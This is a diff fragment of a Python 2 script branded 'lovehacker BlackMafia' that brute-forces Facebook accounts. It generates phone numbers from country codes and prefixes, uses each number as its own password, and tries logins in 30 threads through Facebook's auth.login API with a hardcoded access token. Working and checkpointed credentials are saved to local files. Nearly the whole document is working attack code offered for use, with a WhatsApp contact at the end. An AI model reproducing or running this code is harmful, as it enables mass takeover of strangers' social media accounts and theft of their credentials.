+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="4":
+		os.system("clear")
+		print (logo4)
+		print("\033[1;93m954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="5":
+		os.system("clear")
+		print (logo5)
+		print("\033[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+55"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="6":
+		os.system("clear")
+		print (logo6)
+		print("\033[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+81"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="7":
+		os.system("clear")
+		print (logo7)
+		print("\033[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+82"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="8":
+		os.system("clear")
+		print (logo8)
+		print("\033[1;93m388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+39"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="9":
+		os.system("clear")
+		print (logo9)
+		print("\033[1;93m60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+34"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="10":
+		os.system("clear")
+		print (logo10)
+		print("\033[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+48"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+        elif lovehackerx =="11":
+		os.system("clear")
+		print (logo13)
+		print("\033[1;93m01, ~~~, 49")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+        elif lovehackerx =="12":
+		os.system("clear")
+		print (logo12)
+		print("\033[1;93m161, ~~~~, 197")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+        elif lovehackerx =="13":
+		os.system("clear")
+		print (logo17)
+		print("\033[1;93m1,2,3,4,5,6,7,8,9")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+003069"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =='0':
+		login()
+	else:
+		print '[!] Fill in correctly'
+		action()
+
+	xxx = str(len(id))
+	jalan ('[✓] Total Numbers: '+xxx)
+	time.sleep(0.5)
+	jalan ('[✓] Please wait, process is running ...')
+	time.sleep(0.5)
+	jalan ('[!] To Stop Process Press CTRL Then Press z')
+	time.sleep(0.5)
+	print 44*'-'
+	print
+	
+			
+	def main(arg):
+		global cpb,oks
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92m[live  ok]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;95m[Error CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+#				else:
+#				    pass2="ComingSoon"
+#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+#				    q = json.load(data)
+#				    if 'access_token' in q:
+#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass2+'\n'+"\n"
+#				        okb = open('save/successfull.txt', 'a')
+#				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
+#				        okb.close()
+#				        oks.append(c+user+pass2)
+#				    else:
+#				        if 'www.facebook.com' in q['error_msg']:
+#					        print '[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass2+'\n'
+#					        cps = open('save/checkpoint.txt', 'a')
+#					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
+#					        cps.close()
+#					        cpb.append(c+user+pass2)
+																	
+															
+		except:
+			pass
 		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 44*'-'
+	print '[✓] Process Has Been Completed ....'
+	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	print """
+\033[1;93m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
+\033[1;93m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
+\033[1;93m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
+\033[1;93m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
+\033[1;93m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
+\033[1;93m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+\033[1;92m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
+\033[1;92m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
+\033[1;92m██╔████╔██║███████║█████╗░░██║███████║
+\033[1;92m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
+\033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
+\033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
+ 
+ Don't Worry Your Error cp ID Will Be Open After 7 Days 
+•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
+: \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
+•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
+                WhatsApp Num
+              \033[1;91m +923094161457"""
+	
+	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
+	login()	
           
 if __name__ == '__main__':
 	login()
